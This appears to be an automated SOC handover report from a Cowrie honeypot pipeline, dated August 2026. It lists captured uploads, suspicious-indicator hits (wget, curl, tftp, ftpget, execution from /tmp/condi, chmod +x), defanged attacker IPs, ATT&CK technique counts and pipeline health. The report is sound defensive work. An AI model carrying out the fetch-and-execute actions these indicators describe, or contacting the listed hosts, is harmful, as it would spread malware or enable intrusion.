| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `223.210.27[.]53` | CN | BeiJing Guoxin bilin Telecom Technology Co.,Ltd | **100** ⚠️ | 50 |
| `91.92.209[.]22` | IR | Telecommunication Company of Tehran | **100** ⚠️ | 2 |
| `85.195.9[.]20` | SE | Bng; gbg | **100** ⚠️ | 50 |
| `194.59.245[.]3` | FR | BEAFORT LIMITED | **100** ⚠️ | 0 |
| `104.238.110[.]208` | US | GoDaddy.com, LLC | **100** ⚠️ | 40 |
| `147.15.110[.]51` | BR | Oracle Corporation | **100** ⚠️ | 1 |
| `78.187.230[.]168` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 43 |
| `124.133.10[.]66` | CN | JINAN SONGJIAN NETBAR | **100** ⚠️ | 48 |
| `143.255.14[.]32` | BR | RBT Internet | **100** ⚠️ | 5 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 83 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 78 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 1 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 17 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 3 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 126 cases |
| Tool 34  | Credential Extractor        | ✅ 94 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (12.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 60 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 16 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 78 priority case(s) shown individually · 16 recon entry/entries in table (6 group(s) consolidating 22 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-22T20:28:48Z_
